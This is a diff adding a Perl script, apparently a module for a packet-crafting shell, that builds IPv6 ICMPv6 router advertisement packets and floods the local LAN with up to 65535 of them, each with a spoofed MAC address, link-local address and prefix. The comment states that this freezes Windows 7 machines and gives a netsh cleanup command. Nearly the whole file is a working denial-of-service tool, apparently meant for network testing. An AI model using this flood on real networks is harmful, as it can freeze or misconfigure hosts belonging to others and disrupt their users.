@@ -1,0 +1,98 @@
+# IPv6 ICMPv6 router advertisement to local LAN
+#
+# WARNING:  As of 1/1/2012, Windows 7 autoconfiguration is vulnerable to 
+# this 'attack'.  Multiple router advertisements will cause multiple IPv6 
+# addresses to be configured and freeze the computer.
+#
+# To remove addresses configured from this 'test', use:
+#
+#    netsh interface ipv6 delete address "Interface_Name" <IPv6_Address>
+
+if (!(MAC_SRC && IPv6_SRC_LL)) {
+    print "Run `interface' command first\n";
+    return;
+}
+
+use Net::Frame::Layer::IPv6 qw(:consts);
+use Net::Frame::Layer::ICMPv6 qw(:consts);
+use Net::Frame::Layer::ICMPv6::RouterAdvertisement;
+
+print "How many RA to send? (1 <= # <= 65535) [1] ";
+my $num = <STDIN>;
+chomp $num;
+print "\n";
+
+if ($num eq '') { $num = 1; }
+
+if ($num !~ /^\d+$/) {
+    print "Invalid number `$num', using 1\n";
+    $num = 1;
+} elsif (($num < 1) || ($num > 65535)) {
+    print "Invalid number `$num', using 1\n";
+    $num = 1;
+}
+
+if ($num == 1) {
+
+    $ether  = ETHER(dst=>'33:33:00:00:00:01',type=>NF_ETH_TYPE_IPv6);
+    $ipv6   = IPv6(src=>IPv6_SRC_LL,dst=>'FF02::1',nextHeader=>NF_IPv6_PROTOCOL_ICMPv6);
+    $icmpv6 = Net::Frame::Layer::ICMPv6->new(type=>NF_ICMPv6_TYPE_ROUTERADVERTISEMENT);
+
+      my $prefixLength = 64;
+      my $flag = 0xc0;
+      my $validLifetime = 86400;
+      my $preferredLifetime = 14400;
+      my $RESERVED = 0x00000000;
+      my $prefix = "2001:db8:dead::";
+
+      my $value  = sprintf "%.2x", $prefixLength;
+         $value .= sprintf "%.2x", $flag;
+         $value .= sprintf "%.8x", $validLifetime;
+         $value .= sprintf "%.8x", $preferredLifetime;
+         $value .= sprintf "%.8x", $RESERVED;
+         $value .= unpack "H*", Net::Frame::Layer::inet6Aton($prefix);
+
+    $option = Net::Frame::Layer::ICMPv6::Option->new(type=>3,value=>pack "H*", $value);
+    $option->computeLengths;
+    $option->pack;
+    $ra     = Net::Frame::Layer::ICMPv6::RouterAdvertisement->new(routerLifetime=>90,curHopLimit=>64,options=>[$option]);
+
+    $packet = packet $ether,$ipv6,$icmpv6,$ra;
+
+    decode $packet;
+
+    print "\n\nType:\n\n  sendp \$packet\n\nto execute\n";
+
+} else {
+
+    $icmpv6 = Net::Frame::Layer::ICMPv6->new(type=>NF_ICMPv6_TYPE_ROUTERADVERTISEMENT);
+
+    my $prefixLength = 64;
+    my $flag = 0xc0;
+    my $validLifetime = 86400;
+    my $preferredLifetime = 14400;
+    my $RESERVED = 0x00000000;
+
+    undef @packets;
+    for (my $i = 1; $i <= $num; $i++) {
+
+        my $iid = sprintf "%04x", $i;
+        my $mac = substr($iid, 0, 2) . ":" . substr($iid, 2, 2);
+        $ether  = ETHER(src=>"00:00:DE:AD:$mac",dst=>'33:33:00:00:00:01',type=>NF_ETH_TYPE_IPv6);
+        $ipv6   = IPv6(src=>"fe80::dead:$iid",dst=>'FF02::1',nextHeader=>NF_IPv6_PROTOCOL_ICMPv6);
+          my $prefix = '2001:db8:dead:' . $iid . '::';
+
+          my $value  = sprintf "%.2x", $prefixLength;
+             $value .= sprintf "%.2x", $flag;
+             $value .= sprintf "%.8x", $validLifetime;
+             $value .= sprintf "%.8x", $preferredLifetime;
+             $value .= sprintf "%.8x", $RESERVED;
+             $value .= unpack "H*", Net::Frame::Layer::inet6Aton($prefix);
+
+        $option = Net::Frame::Layer::ICMPv6::Option->new(type=>3,length=>4,value=>pack "H*", $value);
+        $ra     = Net::Frame::Layer::ICMPv6::RouterAdvertisement->new(routerLifetime=>90,curHopLimit=>64,payload=>$option->pack);
+
+        push @packets, packet $ether,$ipv6,$icmpv6,$ra;
+    }
+    print "\n\nType:\n\n  sendp \\\@packets\n\nto execute\n";
+}
